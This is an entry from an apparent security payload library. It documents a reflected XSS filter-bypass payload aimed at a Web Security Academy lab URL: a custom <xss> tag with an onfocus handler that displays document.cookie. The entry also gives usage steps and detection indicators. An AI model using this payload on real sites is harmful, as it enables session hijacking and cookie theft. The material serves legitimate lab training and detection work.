---
id: 003175df-ba80-4bc1-97c8-3d594ddf16fd
type: code
language: JavaScript
verified: true
created_at: '2020-08-27T09:45:04.767225+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
platforms:
  - Web
tags:
  - xss
  - payload
  - bypass
validated: true
---

# JavaScript-Redirect-to-Reflected-XSS-with-Custom-Tag

## Code

```javascript
<script>
location = 'https://your-lab-id.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
```

## Description

This JavaScript code snippet creates a redirect to a vulnerable web application's reflected parameter URL, injecting a custom <xss> tag with an onfocus event handler to execute an alert stealing document cookies. The tabindex=1 forces focus on the element, triggering the event and bypassing standard tag filters. It is used in reflected XSS scenarios where common tags like <script> are blocked.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| your-lab-id.web-security-academy.net | The base URL of the vulnerable application | lab-id.example.com |

## Usage

Paste this code into an HTML file and open it in a browser, or execute it in the console on a page under the same origin policy constraints. It redirects to the target URL with the encoded payload, automatically triggering the XSS upon focus. Ideal for proof-of-concept exploits in web security labs or penetration testing to demonstrate filter bypasses.

## Detection

- Browser developer tools showing unexpected redirects or focus events on custom elements.
- Web application logs capturing suspicious URL-encoded parameters with event handlers like onfocus.
- Client-side monitoring for alert() calls or cookie access in anomalous contexts.
- Content Security Policy (CSP) violations if inline scripts are restricted.

## Related

- [[procedures/Bypass-Tag-Filtering-in-Reflected-XSS-Using-Custom-Tags]]
